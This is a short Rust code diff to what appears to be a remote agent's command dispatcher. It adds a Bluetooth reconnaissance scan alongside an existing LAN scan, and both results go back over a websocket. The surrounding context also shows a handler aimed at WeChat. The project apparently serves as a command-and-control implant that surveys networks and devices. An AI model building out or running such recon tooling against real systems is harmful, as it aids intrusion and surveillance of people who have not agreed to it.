@@ -292,6 +292,10 @@ impl AgentEngine {
                 let r = libra_modules::recon::LanScan::scan().await;
                 ws_send(tx, &agent_id, "system.lanscan.result", &r, rid).await;
             }
+            ws_type::SYSTEM_BLUETOOTH => {
+                let r = libra_modules::recon::BluetoothScanner::scan().await;
+                ws_send(tx, &agent_id, "system.bluetooth.result", &r, rid).await;
+            }
 
             // ── Other software ────────────────────────────────────
             ws_type::OTHERSOFT_WECHAT => {
